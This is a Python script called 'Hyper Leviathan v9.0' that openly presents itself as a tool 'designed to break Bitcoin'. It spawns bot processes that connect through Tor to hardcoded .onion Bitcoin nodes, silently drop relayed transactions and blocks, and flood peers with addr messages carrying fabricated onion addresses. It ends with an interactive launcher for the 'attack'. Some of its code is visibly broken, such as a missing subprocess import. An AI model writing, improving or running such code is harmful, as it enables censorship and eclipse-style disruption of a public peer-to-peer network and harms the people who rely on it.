#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗                                 ║
║   ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗                                ║
║   ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝                                ║
║   ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗                                ║
║   ██║  ██║   ██║   ██║     ███████╗██║  ██║                                ║
║   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝                                ║
║                                                                               ║
║   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗  ║
║   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║  ║
║   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║  ║
║   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║  ║
║   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║  ║
║   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝  ║
║                                                                               ║
║                    ⚡ v9.0 - TOR MULTIPROCESSING CORE ⚡                         ║
║                    Designed to break Bitcoin from 1 Machine                    ║
║                    Uses 5 Cores + Tor Onion Network                            ║
║                    NO Fake IPs. NO Public Proxies.                                ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import socket
import struct
import hashlib
import time
import random
import sys
import os

# ============================================================================
#                         AUTO INSTALLER
# ============================================================================

def install_dependencies():
    """Installs pysocks automatically"""
    print("[*] Installing required dependencies...")
    try:
        import socks
        print("[+] socks is already installed.")
    except ImportError:
        print("[-] socks not found. Installing...")
        try:
            subprocess.check_call(
                [sys.executable, '-m', 'pip', 'install', 'socks', '-q'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("[+] socks installed successfully.")
        except Exception as e:
            print(f"[!] Failed to install socks: {e}")
            print("[!] Please run: pip install socks")
            sys.exit(1)

# Try importing immediately
try:
    import socks
except ImportError:
    install_dependencies()
    import socks

# Now import other standard libraries
import concurrent.futures
import threading
from multiprocessing import Manager, Queue, Process, Value
import socks  # From pysocks

# ============================================================================
#                         CONFIGURATION
# ============================================================================

# Number of cores to use (Adjust to your CPU)
# User requested i5 5 cores, but we can increase if system allows
NUM_CORES = 5 
MAX_WORKERS = NUM_CORES  # Use 5 workers to match 5 cores

# Tor Configuration
TOR_HOST = "127.0.0.1"
TOR_PORT = 9050

# Bitcoin .onion Nodes (Hardcoded for reliability)
# Using v3 onion addresses which are more stable
ONION_NODES = [
    ("explorerzydxu5ecjrkwceayqybizmpjjznk5izmitf2modhcusuqlid.onion", 8333),
    ("kpgvmscirrdqpekbqjsvw5teanhatztpp2gl6eee4zez7nyber3dabqd.onion", 8333),
    ("xqzfakpeuvrobvpj.onion", 8333),
    ("bk5ejfe56xakvtkk.onion", 8333),
    ("czb4z3y.onion", 8333),
    ("kpgvmscirrdqpekbqjsvw5teanhatztpp2gl6eee4zez7nyber3dabqd.onion", 8333),
    ("l7kw3vjs4cf2gqax.onion", 8333),
    ("kjy2eqzk4zwi5zd3.onion", 8333),
    ("hhiv5pnxenvbf4am.onion", 8333),
    ("bsqbtcparrfihlwu.onion", 8333),
    ("sxjbhmhob2xasx3v.onion", 8333),
    ("txcptkrkbkltw3it.onion", 8333),
    ("i2r5tbaizbi7k6qj.onion", 8333),
    ("xdnigz4sv5k7xfj2.onion", 8333),
    ("uquusxv4lf3mbphy7vq2lzz7y2fqhih4ay6gtwuaiqpf7vbmibwzyqad.onion", 8333),
]

# ============================================================================
#                         BITCOIN PROTOCOL (TOR OPTIMIZED)
# ============================================================================

def sha256d(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def make_message(cmd, payload=b''):
    magic = b'\xf9\xbe\xb4\xd9'
    command = cmd.encode().ljust(12, b'\x00')
    length = struct.pack('<I', len(payload))
    checksum = sha256d(payload)[:4]
    return magic + command + length + checksum + payload

def varint(n):
    if n < 0xfd: return bytes([n])
    elif n <= 0xffff: return b'\xfd' + struct.pack('<H', n)
    elif n <= 0xffffffff: return b'\xfe' + struct.pack('<I', n)
    return b'\xff' + struct.pack('<Q', n)

def read_varint(data, pos):
    if pos >= len(data): return 0, pos
    b = data[pos]
    if b < 0xfd: return b, pos + 1
    elif b == 0xfd: return struct.unpack('<H', data[pos+1:pos+3])[0], pos + 3
    elif b == 0xfe: return struct.unpack('<I', data[pos+1:pos+5])[0], pos + 5
    return struct.unpack('<Q', data[pos+1:pos+9])[0], pos + 9

def make_version_onion():
    """Creates a version message suitable for Tor nodes"""
    version = 70016
    services = 0x0409
    timestamp = int(time.time())
    
    # For Tor, we usually send 0.0.0.0 or localhost
    addr_recv = struct.pack('<Q', 1) + b'\x00' * 26
    
    # Our 'fake' source addr
    # Note: In Tor, the real IP is hidden, so we don't need to spoof IPv4 here.
    # But we can pretend to be a random node.
    addr_from = struct.pack('<Q', services) + b'\x00' * 26
    
    nonce = struct.pack('<Q', random.getrandbits(64))
    
    # Random User Agent
    user_agents = [
        b'/Satoshi:27.0.0/',
        b'/Satoshi:26.0.0/',
        b'/Satoshi:25.1.0/',
        b'/Satoshi:24.2.0/',
        b'/Bitcoin Core:26.0.0/',
    ]
    ua = random.choice(user_agents)
    height = struct.pack('<i', random.randint(870000, 900000))
    
    payload = struct.pack('<iQq', version, services, timestamp)
    payload += addr_recv + addr_from + nonce
    payload += varint(len(ua)) + ua + height + b'\x01'
    
    return make_message('version', payload)

def make_verack(): return make_message('verack')
def make_ping(): return make_message('ping', struct.pack('<Q', random.getrandbits(64)))
def make_pong(nonce): return make_message('pong', nonce)
def make_mempool(): return make_message('mempool')
def make_feefilter(): return make_message('feefilter', struct.pack('<Q', 0))
def make_sendheaders(): return make_message('sendheaders')
def make_getaddr(): return make_message('getaddr')

def make_addr_onion(onion_addrs):
    """Creates addr message with onion addresses"""
    # For simplicity and speed, we use varint count
    payload = varint(len(onion_addrs))
    
    for addr in onion_addrs:
        # Tor uses addrv2 for .onion usually, but addr works too for standard clients
        # To be safe, we just use IPv6 mapped address representation
        try:
            # Use a fake IP just for the structure, Tor handles routing
            ip_bytes = b'\xfd\x87\xd8\x7e\xeb\x43' + random.randbytes(12)
            
            payload += struct.pack('<I', int(time.time()) - random.randint(0, 3600))
            payload += struct.pack('<Q', 0x0409)
            payload += ip_bytes
            payload += struct.pack('>H', 8333)
        except:
            pass
    
    return make_message('addr', payload)

def parse_inv(payload):
    items = []
    try:
        count, pos = read_varint(payload, 0)
        for _ in range(min(count, 50000)):
            if pos + 36 > len(payload): break
            t = struct.unpack('<I', payload[pos:pos+4])[0]
            h = payload[pos+4:pos+36][::-1].hex()[:16]
            pos += 36
            items.append((t, h))
    except:
        pass
    return items

# ============================================================================
#                         WORKER FUNCTION (MULTIPROCESSING)
# ============================================================================

def bot_worker(bot_id, nodes, tor_proxy, duration, poison_interval, stats_queue):
    """
    Individual bot process.
    This function runs in a separate process, utilizing a full CPU core.
    """
    
    # Initialize random seed for this process to ensure unique behavior
    random.seed(bot_id + time.time_ns())
    
    # Create a shared stats counter for this bot
    local_stats = {
        'id': bot_id,
        'connected': 0,
        'failed': 0,
        'tx_blocked': 0,
        'blocks_blocked': 0,
        'addr_poisoned': 0,
        'errors': 0,
        'uptime': 0
    }
    
    # Target selection
    target = nodes[bot_id % len(nodes)]
    host, port = target
    
    # Poisoning material: Create fake onion addresses to flood the network
    # Format: [16 chars].onion
    def gen_fake_onion():
        chars = 'abcdefghijklmnopqrstuvwxyz234567'
        return ''.join(random.choice(chars) for _ in range(16)) + '.onion'
    
    fake_onions = [gen_fake_onion() for _ in range(10)]
    
    # Connection Loop
    end_time = time.time() + duration
    last_poison = time.time()
    last_keepalive = time.time()
    
    while time.time() < end_time:
        try:
            # 1. Create Socket via Tor
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.set_proxy(socks.SOCKS5, tor_proxy[0], tor_proxy[1])
            s.settimeout(20)  # Tor can be slow, so generous timeout
            
            # 2. Connect to .onion node
            s.connect((host, port))
            
            # 3. Bitcoin Handshake
            s.sendall(make_version_onion())
            
            # Receive version (simple blocking for this process)
            # Using a simple recv wrapper for performance
            data = b''
            while len(data) < 24:
                d = s.recv(24 - len(data))
                if not d: raise ConnectionError
                data += d
            
            # Check magic and parse header
            if data[:4] != b'\xf9\xbe\xb4\xd9': raise Exception("Bad magic")
            cmd = data[4:16].rstrip(b'\x00').decode()
            length = struct.unpack('<I', data[16:20])[0]
            
            # Receive payload
            while len(data) < 24 + length:
                d = s.recv(24 + length - len(data))
                if not d: raise ConnectionError
                data += d
            
            if cmd != 'version': raise Exception(f"Expected version, got {cmd}")
            
            # Send Verack
            s.sendall(make_verack())
            
            # Receive Verack (Wait briefly)
            s.settimeout(5)
            try:
                data = s.recv(1024)
                if data[:4] != b'\xf9\xbe\xb4\xd9': raise Exception("Bad magic")
                cmd = data[4:16].rstrip(b'\x00').decode()
                if cmd == 'verack':
                    pass # Good
                elif cmd == 'ping':
                    nonce = struct.unpack('<Q', data[24:32])[0]
                    s.sendall(make_pong(nonce))
            except socket.timeout:
                pass # Might get other messages, verack is assumed if version was good
            
            # 4. Connection Established - Attack Phase
            local_stats['connected'] += 1
            
            # Send post-handshake messages
            s.sendall(make_sendheaders())
            s.sendall(make_feefilter())
            s.sendall(make_mempool())  # Request their mempool to trigger inv
            s.sendall(make_getaddr())   # Request peers
            
            # 5. Main Loop (Attack)
            start_loop = time.time()
            loop_timeout = end_time - start_loop
            
            while time.time() < end_time:
                try:
                    s.settimeout(1.0)  # Non-blocking read
                    
                    # Receive data
                    try:
                        header = s.recv(24)
                        if not header: raise ConnectionError
                        
                        if header[:4] != b'\xf9\xbe\xb4\xd9': continue
                        
                        cmd = header[4:16].rstrip(b'\x00').decode()
                        length = struct.unpack('<I', header[16:20])[0]
                        
                        payload = b''
                        while len(payload) < length:
                            chunk = s.recv(min(4096, length - len(payload)))
                            if not chunk: raise ConnectionError
                            payload += chunk
                            
                        # CENSORSHIP & INTERCEPTION LOGIC
                        if cmd == 'inv':
                            items = parse_inv(payload)
                            for t, h in items:
                                if t in (1, 0x40000001):  # TX
                                    local_stats['tx_blocked'] += 1
                                elif t in (2, 0x40000002):  # Block
                                    local_stats['blocks_blocked'] += 1
                            
                            # DO NOT FORWARD. DROP IT.
                        
                        elif cmd == 'ping':
                            # Reply to keep-alive
                            nonce = struct.unpack('<Q', payload[:8])[0]
                            s.sendall(make_pong(nonce))
                        
                        elif cmd == 'tx':
                            # Absorb transaction
                            local_stats['tx_blocked'] += 1
                        
                        elif cmd == 'block':
                            # Absorb block
                            local_stats['blocks_blocked'] += 1
                        
                        # Ignore everything else or handle minimally
                        elif cmd in ('addr', 'headers', 'sendheaders', 'sendcmpct'):
                            pass 
                        
                    except socket.timeout:
                        pass # No data, loop again
                    
                    # POISONING LOGIC
                    if time.time() - last_poison > poison_interval:
                        try:
                            # Generate new fake onions to prevent detection of patterns
                            current_fakes = [gen_fake_onion() for _ in range(10)]
                            s.sendall(make_addr_onion(current_fakes))
                            local_stats['addr_poisoned'] += len(current_fakes)
                            last_poison = time.time()
                        except:
                            pass
                    
                    # Keepalive
                    if time.time() - last_keepalive > 60:
                        try:
                            s.sendall(make_ping())
                            last_keepalive = time.time()
                        except:
                            raise ConnectionError("Ping failed")
                            
                    local_stats['uptime'] += 1
                    
                except (socket.timeout, ConnectionError, OSError) as e:
                    raise
            
            # Clean Disconnect
            s.close()
            
        except (socket.timeout, ConnectionError, OSError, Exception) as e:
            local_stats['failed'] += 1
            local_stats['errors'] += 1
            try:
                s.close()
            except:
                pass
            
            # Short backoff before reconnecting
            time.sleep(1)
    
    # Final report
    stats_queue.put(local_stats)


# ============================================================================
#                         MAIN COORDINATOR
# ============================================================================

class LeviathanCore:
    def __init__(self):
        self.manager = Manager()
        self.stats_queue = Queue()
        self.aggregate_stats = {
            'total_bots': 0,
            'connected': 0,
            'failed': 0,
            'errors': 0,
            'total_uptime': 0,
            'tx_blocked': 0,
            'blocks_blocked': 0,
            'addr_poisoned': 0
        }
        self.running = True

    def run(self, num_bots, duration):
        print("\n" + "="*80)
        print("           ⚡ HYPER LEVIATHAN v9.0 - TOR MULTIPROCESSING CORE ⚡")
        print("="*80)
        print(f"   [CONFIGURATION]")
        print(f"   ├─ Bots:            {num_bots}")
        print(f"   ├─ Duration:        {duration}s")
        print(f"   ├─ Cores Used:      {NUM_CORES} (Max Workers)")
        print(f"   ├─ Network:         Tor (.onion)")
        print(f"   ├─ Proxy:           {TOR_HOST}:{TOR_PORT}")
        print(f"   └─ Strategy:       Connect -> Censor -> Poison -> Repeat")
        print("="*80)
        print("\n[!] INITIALIZING TOR MULTIPROCESSING ATTACK...")
        
        start_time = time.time()
        
        # Use ProcessPoolExecutor to manage the 5 cores
        with concurrent.futures.ProcessPoolExecutor(max_workers=NUM_CORES) as executor:
            # Submit all bots to the pool
            futures = []
            for i in range(num_bots):
                future = executor.submit(
                    bot_worker,
                    bot_id=i,
                    nodes=ONION_NODES,
                    tor_proxy=(TOR_HOST, TOR_PORT),
                    duration=duration,
                    poison_interval=30,  # Poison every 30s
                    stats_queue=self.stats_queue
                )
                futures.append(future)
            
            # Start a separate thread to collect stats without blocking the pool
            stats_thread = threading.Thread(target=self.collect_stats, args=(duration,))
            stats_thread.daemon = True
            stats_thread.start()
            
            # Monitor progress
            completed = 0
            while completed < num_bots:
                time.sleep(1)
                # Check futures
                for f in futures:
                    if f.done():
                        completed += 1
                
                # Print progress periodically
                if int(time.time()) % 10 == 0:
                    self.print_progress(len(futures), completed, start_time)
            
            # Wait for all to finish
            concurrent.futures.wait(futures, timeout=duration+30)
            self.running = False
        
        stats_thread.join()
        self.print_final_report()
    
    def collect_stats(self, duration):
        """Collects stats from bots in real-time"""
        end = time.time() + duration
        while time.time() < end:
            try:
                # Drain queue
                count = 0
                while True:
                    try:
                        stat = self.stats_queue.get(timeout=0.1)
                        self.aggregate_stats['connected'] += stat['connected']
                        self.aggregate_stats['failed'] += stat['failed']
                        self.aggregate_stats['errors'] += stat['errors']
                        self.aggregate_stats['total_uptime'] += stat['uptime']
                        self.aggregate_stats['tx_blocked'] += stat['tx_blocked']
                        self.aggregate_stats['blocks_blocked'] += stat['blocks_blocked']
                        self.aggregate_stats['addr_poisoned'] += stat['addr_poisoned']
                        count += 1
                    except:
                        break
                
                if count > 0:
                    self.print_stats_snapshot()
                
            except Exception:
                pass
            
            time.sleep(2)
    
    def print_progress(self, total, done, start):
        elapsed = int(time.time() - start)
        rate = done / elapsed if elapsed > 0 else 0
        print(f"[PROGRESS] {done}/{total} bots ({rate:.2f} bots/sec) | {elapsed}s elapsed")
    
    def print_stats_snapshot(self):
        s = self.aggregate_stats
        print(f"\r[STATS] TXs Blocked: {s['tx_blocked']:,} | Blocks: {s['blocks_blocked']:,} | Connections: {s['connected']:,} | Failed: {s['failed']:,} | Poisoned: {s['addr_poisoned']:,}", end='')
        sys.stdout.flush()
    
    def print_final_report(self):
        s = self.aggregate_stats
        
        print("\n" + "="*80)
        print("                        📊 ATTACK REPORT")
        print("="*80)
        print(f"  Total Bots Spawned:       {s['total_bots']}")
        print(f"  Successful Connections:  {s['connected']}")
        print(f"  Failed Connections:      {s['failed']}")
        print(f"  Errors:                 {s['errors']}")
        print("-"*80)
        print(f"  Total Uptime:           {s['total_uptime']:,} sec")
        print(f"  Transactions Blocked:   {s['tx_blocked']:,}")
        print(f"  Blocks Blocked:         {s['blocks_blocked']:,}")
        print(f"  Addr Messages Poisoned: {s['addr_poisoned']:,}")
        print("-"*80)
        print(f"  Network Impact:         {'HIGH' if s['tx_blocked'] > 1000 else 'LOW'}")
        print("="*80)

# ============================================================================
#                         LAUNCHER
# ============================================================================

def main():
    print("""
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                               ║
    ║   ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗                                 ║
    ║   ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗                                ║
    ║   ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝                                ║
    ║   ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗                                ║
    ║   ██║  ██║   ██║   ██║     ███████╗██║  ██║                                ║
    ║   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝                                ║
    ║                                                                               ║
    ║   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗  ║
    ║   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║  ║
    ║   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║  ║
    ║   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║  ║
    ║   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║  ║
    ║   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝  ║
    ║                                                                               ║
    ║                 ⚡ TOR MULTIPROCESSING EDITION ⚡                               ║
    ║                 Utilizing {NUM_CORES} Cores to Maximum Potential                 ║
    ║                                                                               ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    print("[SYSTEM REQUIREMENTS]")
    print("  1. Tor must be running on 127.0.0.1:9050")
    print("  2. Run: sudo systemctl start tor")
    print("  3. CPU: i5 or better recommended")
    
    num_bots = int(input("\n[?] Number of bots (Recommended: 2000): "))
    duration = int(input("[?] Attack duration in seconds (Recommended: 300): "))
    
    if input("[?] Initiate Attack? (y/n): ").strip().lower() == 'y':
        leviathan = LeviathanCore()
        leviathan.aggregate_stats['total_bots'] = num_bots
        leviathan.run(num_bots, duration)
    else:
        print("Attack aborted.")

if __name__ == "__main__":
    main()